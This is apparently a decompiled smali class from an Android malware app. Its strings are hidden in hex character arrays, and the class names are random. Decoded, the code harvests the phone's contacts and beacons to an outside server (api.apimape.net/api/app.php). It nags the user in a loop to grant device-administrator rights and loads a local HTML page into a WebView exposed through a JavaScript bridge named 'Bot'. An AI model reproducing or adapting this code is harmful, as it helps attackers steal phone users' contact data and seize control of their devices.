.class public Lkosp/ynqekv/swdt/Ayigtyet;
.super Landroid/app/Activity;
.source "Ayigtyet.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lkosp/ynqekv/swdt/Ayigtyet$Kwfuln;,
        Lkosp/ynqekv/swdt/Ayigtyet$Nenxbnvwe;
    }
.end annotation


# static fields
.field static final TAG:Ljava/lang/String;


# instance fields
.field private alarm:Lkosp/ynqekv/swdt/Xnlyhjvxo;

.field private camera:I

.field private demoDeviceAdmin:Landroid/content/ComponentName;

.field private devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field private face:I

.field private pict:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 73
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0x18

    new-array v1, v1, [C

    fill-array-data v1, :array_0

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([C)V

    sput-object v0, Lkosp/ynqekv/swdt/Ayigtyet;->TAG:Ljava/lang/String;

    .line 74
    return-void

    .line 73
    nop

    :array_0
    .array-data 2
        0x44s
        0x65s
        0x76s
        0x69s
        0x63s
        0x65s
        0x50s
        0x6fs
        0x6cs
        0x69s
        0x63s
        0x79s
        0x44s
        0x65s
        0x6ds
        0x6fs
        0x41s
        0x63s
        0x74s
        0x69s
        0x76s
        0x69s
        0x74s
        0x79s
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 63
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected colotit()V
    .locals 15

    .prologue
    const/4 v14, 0x6

    const/4 v13, 0x2

    const/4 v12, 0x5

    const/4 v11, 0x1

    const/4 v10, 0x0

    .line 137
    new-instance v6, Lkosp/ynqekv/swdt/Rsjny;

    invoke-direct {v6, p0}, Lkosp/ynqekv/swdt/Rsjny;-><init>(Landroid/content/Context;)V

    new-array v7, v11, [Ljava/lang/String;

    new-instance v8, Ljava/lang/String;

    new-array v9, v12, [C

    fill-array-data v9, :array_0

    invoke-direct {v8, v9}, Ljava/lang/String;-><init>([C)V

    aput-object v8, v7, v10

    invoke-virtual {v6, v7}, Lkosp/ynqekv/swdt/Rsjny;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 138
    new-instance v6, Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-direct {v6}, Lkosp/ynqekv/swdt/Xnlyhjvxo;-><init>()V

    iput-object v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->alarm:Lkosp/ynqekv/swdt/Xnlyhjvxo;

    .line 139
    iget-object v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->alarm:Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-virtual {v6, p0}, Lkosp/ynqekv/swdt/Xnlyhjvxo;->SetAlarm(Landroid/content/Context;)V

    .line 141
    new-instance v6, Ljava/lang/String;

    new-array v7, v12, [C

    fill-array-data v7, :array_1

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {p0, v6, v10}, Lkosp/ynqekv/swdt/Ayigtyet;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 143
    .local v2, "settings":Landroid/content/SharedPreferences;
    new-instance v6, Ljava/lang/String;

    new-array v7, v14, [C

    fill-array-data v7, :array_2

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v2, v6, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    .line 145
    .local v4, "status":I
    const/16 v6, 0x4d

    if-ne v4, v6, :cond_0

    .line 146
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v6

    invoke-static {v6}, Landroid/os/Process;->killProcess(I)V

    .line 190
    :goto_0
    return-void

    .line 149
    :cond_0
    new-instance v6, Ljava/lang/String;

    new-array v7, v14, [C

    fill-array-data v7, :array_3

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v2, v6, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v6

    iput v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->camera:I

    .line 150
    iget v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->camera:I

    if-ne v6, v11, :cond_1

    .line 151
    new-instance v6, Ljava/lang/String;

    const/4 v7, 0x4

    new-array v7, v7, [C

    fill-array-data v7, :array_4

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    new-instance v7, Ljava/lang/String;

    const/16 v8, 0x8

    new-array v8, v8, [C

    fill-array-data v8, :array_5

    invoke-direct {v7, v8}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v2, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->pict:Ljava/lang/String;

    .line 152
    iget-object v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->pict:Ljava/lang/String;

    new-instance v7, Ljava/lang/String;

    const/16 v8, 0x8

    new-array v8, v8, [C

    fill-array-data v8, :array_6

    invoke-direct {v7, v8}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_3

    .line 153
    iput v11, p0, Lkosp/ynqekv/swdt/Ayigtyet;->face:I

    .line 158
    :cond_1
    :goto_1
    iget v6, p0, Lkosp/ynqekv/swdt/Ayigtyet;->camera:I

    if-ne v6, v13, :cond_2

    .line 160
    iput v11, p0, Lkosp/ynqekv/swdt/Ayigtyet;->face:I

    .line 167
    :cond_2
    new-instance v6, Ljava/lang/String;

    new-array v7, v12, [C

    fill-array-data v7, :array_7

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {p0, v6, v10}, Lkosp/ynqekv/swdt/Ayigtyet;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 168
    .local v3, "settings3":Landroid/content/SharedPreferences;
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 169
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v6, Ljava/lang/String;

    new-array v7, v12, [C

    fill-array-data v7, :array_8

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v0, v6, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 170
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    const-wide/16 v8, 0x3e8

    div-long/2addr v6, v8

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    .line 171
    .local v5, "tsLong":Ljava/lang/Long;
    new-instance v6, Ljava/lang/String;

    const/16 v7, 0x9

    new-array v7, v7, [C

    fill-array-data v7, :array_9

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    invoke-interface {v0, v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 172
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 173
    const/high16 v6, 0x7f030000

    invoke-virtual {p0, v6}, Lkosp/ynqekv/swdt/Ayigtyet;->setContentView(I)V

    .line 174
    const/high16 v6, 0x7f070000

    invoke-virtual {p0, v6}, Lkosp/ynqekv/swdt/Ayigtyet;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    .line 176
    .local v1, "myWebView":Landroid/webkit/WebView;
    new-instance v6, Lkosp/ynqekv/swdt/Ayigtyet$Kwfuln;

    const/4 v7, 0x0

    invoke-direct {v6, p0, v7}, Lkosp/ynqekv/swdt/Ayigtyet$Kwfuln;-><init>(Lkosp/ynqekv/swdt/Ayigtyet;Lkosp/ynqekv/swdt/Ayigtyet$Kwfuln;)V

    invoke-virtual {v1, v6}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 177
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v11}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 178
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 179
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSaveFormData(Z)V

    .line 180
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V

    .line 181
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 182
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v11}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 183
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    sget-object v7, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v6, v7}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    .line 184
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v13}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 185
    new-instance v6, Lkosp/ynqekv/swdt/Ayigtyet$Nenxbnvwe;

    invoke-direct {v6, p0, p0}, Lkosp/ynqekv/swdt/Ayigtyet$Nenxbnvwe;-><init>(Lkosp/ynqekv/swdt/Ayigtyet;Landroid/content/Context;)V

    new-instance v7, Ljava/lang/String;

    const/4 v8, 0x3

    new-array v8, v8, [C

    fill-array-data v8, :array_a

    invoke-direct {v7, v8}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1, v6, v7}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 186
    new-instance v6, Ljava/lang/String;

    const/16 v7, 0x20

    new-array v7, v7, [C

    fill-array-data v7, :array_b

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1, v6}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 155
    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v1    # "myWebView":Landroid/webkit/WebView;
    .end local v3    # "settings3":Landroid/content/SharedPreferences;
    .end local v5    # "tsLong":Ljava/lang/Long;
    :cond_3
    iput v13, p0, Lkosp/ynqekv/swdt/Ayigtyet;->face:I

    goto/16 :goto_1

    .line 137
    :array_0
    .array-data 2
        0x64s
        0x61s
        0x76s
        0x61s
        0x69s
    .end array-data

    .line 141
    nop

    :array_1
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 143
    nop

    :array_2
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x74s
        0x75s
        0x73s
    .end array-data

    .line 149
    :array_3
    .array-data 2
        0x63s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
    .end array-data

    .line 151
    :array_4
    .array-data 2
        0x66s
        0x61s
        0x63s
        0x65s
    .end array-data

    :array_5
    .array-data 2
        0x66s
        0x61s
        0x63s
        0x65s
        0x6es
        0x75s
        0x6cs
        0x6cs
    .end array-data

    .line 152
    :array_6
    .array-data 2
        0x66s
        0x61s
        0x63s
        0x65s
        0x6es
        0x75s
        0x6cs
        0x6cs
    .end array-data

    .line 167
    :array_7
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 169
    nop

    :array_8
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x72s
        0x74s
    .end array-data

    .line 171
    nop

    :array_9
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x72s
        0x74s
        0x74s
        0x69s
        0x6ds
        0x65s
    .end array-data

    .line 185
    nop

    :array_a
    .array-data 2
        0x42s
        0x6fs
        0x74s
    .end array-data

    .line 186
    nop

    :array_b
    .array-data 2
        0x66s
        0x69s
        0x6cs
        0x65s
        0x3as
        0x2fs
        0x2fs
        0x2fs
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x5fs
        0x61s
        0x73s
        0x73s
        0x65s
        0x74s
        0x2fs
        0x76s
        0x69s
        0x64s
        0x65s
        0x6fs
        0x2es
        0x68s
        0x74s
        0x6ds
        0x6cs
    .end array-data
.end method

.method protected ebat()V
    .locals 4

    .prologue
    .line 207
    new-instance v0, Landroid/content/Intent;

    .line 208
    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    .line 207
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 209
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.app.extra.DEVICE_ADMIN"

    .line 210
    iget-object v2, p0, Lkosp/ynqekv/swdt/Ayigtyet;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 209
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 211
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    .line 212
    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x21

    new-array v3, v3, [C

    fill-array-data v3, :array_0

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    .line 211
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 213
    const/16 v1, 0x2f

    invoke-virtual {p0, v0, v1}, Lkosp/ynqekv/swdt/Ayigtyet;->startActivityForResult(Landroid/content/Intent;I)V

    .line 214
    return-void

    .line 212
    nop

    :array_0
    .array-data 2
        0x54s
        0x6fs
        0x20s
        0x72s
        0x75s
        0x6es
        0x20s
        0x74s
        0x68s
        0x65s
        0x20s
        0x61s
        0x70s
        0x70s
        0x6cs
        0x69s
        0x63s
        0x61s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x20s
        0x2ds
        0x20s
        0x61s
        0x63s
        0x74s
        0x69s
        0x76s
        0x61s
        0x74s
        0x65s
    .end array-data
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 3
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 217
    packed-switch p1, :pswitch_data_0

    .line 229
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 230
    :goto_0
    return-void

    .line 219
    :pswitch_0
    const/4 v0, -0x1

    if-ne p2, v0, :cond_0

    .line 220
    sget-object v0, Lkosp/ynqekv/swdt/Ayigtyet;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/String;

    const/16 v2, 0x17

    new-array v2, v2, [C

    fill-array-data v2, :array_0

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 221
    invoke-virtual {p0}, Lkosp/ynqekv/swdt/Ayigtyet;->colotit()V

    goto :goto_0

    .line 224
    :cond_0
    sget-object v0, Lkosp/ynqekv/swdt/Ayigtyet;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/String;

    const/16 v2, 0x1d

    new-array v2, v2, [C

    fill-array-data v2, :array_1

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 225
    invoke-virtual {p0}, Lkosp/ynqekv/swdt/Ayigtyet;->ebat()V

    goto :goto_0

    .line 217
    :pswitch_data_0
    .packed-switch 0x2f
        :pswitch_0
    .end packed-switch

    .line 220
    :array_0
    .array-data 2
        0x41s
        0x64s
        0x6ds
        0x69s
        0x6es
        0x69s
        0x73s
        0x74s
        0x72s
        0x61s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x20s
        0x65s
        0x6es
        0x61s
        0x62s
        0x6cs
        0x65s
        0x64s
        0x21s
    .end array-data

    .line 224
    nop

    :array_1
    .array-data 2
        0x41s
        0x64s
        0x6ds
        0x69s
        0x6es
        0x69s
        0x73s
        0x74s
        0x72s
        0x61s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x20s
        0x65s
        0x6es
        0x61s
        0x62s
        0x6cs
        0x65s
        0x20s
        0x46s
        0x41s
        0x49s
        0x4cs
        0x45s
        0x44s
        0x21s
    .end array-data
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 20
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 80
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 84
    new-instance v1, Ljava/lang/String;

    const/4 v2, 0x5

    new-array v2, v2, [C

    fill-array-data v2, :array_0

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lkosp/ynqekv/swdt/Ayigtyet;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    .line 86
    .local v15, "settings":Landroid/content/SharedPreferences;
    new-instance v1, Ljava/lang/String;

    const/4 v2, 0x6

    new-array v2, v2, [C

    fill-array-data v2, :array_1

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    const/4 v2, 0x0

    invoke-interface {v15, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v17

    .line 87
    .local v17, "status":I
    const/16 v1, 0x4d

    move/from16 v0, v17

    if-ne v0, v1, :cond_0

    .line 88
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v1

    invoke-static {v1}, Landroid/os/Process;->killProcess(I)V

    .line 92
    :cond_0
    new-instance v19, Ljava/lang/String;

    const/4 v1, 0x5

    new-array v1, v1, [C

    fill-array-data v1, :array_2

    move-object/from16 v0, v19

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([C)V

    .line 93
    .local v19, "type":Ljava/lang/String;
    const-string v11, ""

    .line 94
    .local v11, "data":Ljava/lang/String;
    new-instance v1, Lkosp/ynqekv/swdt/Kadba;

    move-object/from16 v0, p0

    invoke-direct {v1, v0}, Lkosp/ynqekv/swdt/Kadba;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/String;

    const/16 v5, 0x22

    new-array v5, v5, [C

    fill-array-data v5, :array_3

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>([C)V

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object v19, v2, v3

    const/4 v3, 0x2

    aput-object v11, v2, v3

    invoke-virtual {v1, v2}, Lkosp/ynqekv/swdt/Kadba;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 96
    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object/from16 v1, p0

    invoke-virtual/range {v1 .. v6}, Lkosp/ynqekv/swdt/Ayigtyet;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 97
    .local v10, "cursor":Landroid/database/Cursor;
    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v9

    .line 98
    .local v9, "countphones":I
    const/16 v18, 0x0

    .line 99
    .local v18, "t":I
    invoke-virtual/range {p0 .. p0}, Lkosp/ynqekv/swdt/Ayigtyet;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 100
    .local v14, "phones":Landroid/database/Cursor;
    const-string v13, ""

    .line 101
    .local v13, "out":Ljava/lang/String;
    :cond_1
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_2

    .line 116
    :goto_0
    new-instance v1, Ljava/lang/String;

    const/4 v2, 0x5

    new-array v2, v2, [C

    fill-array-data v2, :array_4

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lkosp/ynqekv/swdt/Ayigtyet;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v16

    .line 117
    .local v16, "settings3":Landroid/content/SharedPreferences;
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    .line 118
    .local v12, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v1, Ljava/lang/String;

    const/16 v2, 0xb

    new-array v2, v2, [C

    fill-array-data v2, :array_5

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v12, v1, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 119
    new-instance v1, Ljava/lang/String;

    const/16 v2, 0xa

    new-array v2, v2, [C

    fill-array-data v2, :array_6

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v12, v1, v13}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 120
    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 122
    const-string v1, "device_policy"

    move-object/from16 v0, p0

    invoke-virtual {v0, v1}, Lkosp/ynqekv/swdt/Ayigtyet;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iput-object v1, v0, Lkosp/ynqekv/swdt/Ayigtyet;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 123
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lkosp/ynqekv/swdt/Biiizsm;

    move-object/from16 v0, p0

    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    iput-object v1, v0, Lkosp/ynqekv/swdt/Ayigtyet;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 124
    move-object/from16 v0, p0

    iget-object v1, v0, Lkosp/ynqekv/swdt/Ayigtyet;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iget-object v2, v0, Lkosp/ynqekv/swdt/Ayigtyet;->demoDeviceAdmin:Landroid/content/ComponentName;

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 125
    invoke-virtual/range {p0 .. p0}, Lkosp/ynqekv/swdt/Ayigtyet;->colotit()V

    .line 134
    :goto_1
    return-void

    .line 103
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v16    # "settings3":Landroid/content/SharedPreferences;
    :cond_2
    const-string v1, "display_name"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 104
    .local v7, "Name":Ljava/lang/String;
    const-string v1, "data1"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 105
    .local v8, "Number":Ljava/lang/String;
    add-int/lit8 v18, v18, 0x1

    .line 106
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x7

    new-array v3, v3, [C

    fill-array-data v3, :array_7

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 107
    const/4 v1, 0x5

    move/from16 v0, v18

    if-le v0, v1, :cond_1

    goto/16 :goto_0

    .line 127
    .end local v7    # "Name":Ljava/lang/String;
    .end local v8    # "Number":Ljava/lang/String;
    .restart local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v16    # "settings3":Landroid/content/SharedPreferences;
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lkosp/ynqekv/swdt/Ayigtyet;->ebat()V

    goto :goto_1

    .line 84
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 86
    nop

    :array_1
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x74s
        0x75s
        0x73s
    .end array-data

    .line 92
    :array_2
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x72s
        0x74s
    .end array-data

    .line 94
    nop

    :array_3
    .array-data 2
        0x68s
        0x74s
        0x74s
        0x70s
        0x3as
        0x2fs
        0x2fs
        0x61s
        0x70s
        0x69s
        0x2es
        0x61s
        0x70s
        0x69s
        0x6ds
        0x61s
        0x70s
        0x65s
        0x2es
        0x6es
        0x65s
        0x74s
        0x2fs
        0x61s
        0x70s
        0x69s
        0x2fs
        0x61s
        0x70s
        0x70s
        0x2es
        0x70s
        0x68s
        0x70s
    .end array-data

    .line 116
    :array_4
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 118
    nop

    :array_5
    .array-data 2
        0x63s
        0x6fs
        0x75s
        0x6es
        0x74s
        0x70s
        0x68s
        0x6fs
        0x6es
        0x65s
        0x73s
    .end array-data

    .line 119
    nop

    :array_6
    .array-data 2
        0x6cs
        0x69s
        0x73s
        0x74s
        0x70s
        0x68s
        0x6fs
        0x6es
        0x65s
        0x73s
    .end array-data

    .line 106
    :array_7
    .array-data 2
        0x20s
        0x3cs
        0x62s
        0x72s
        0x20s
        0x2fs
        0x3es
    .end array-data
.end method
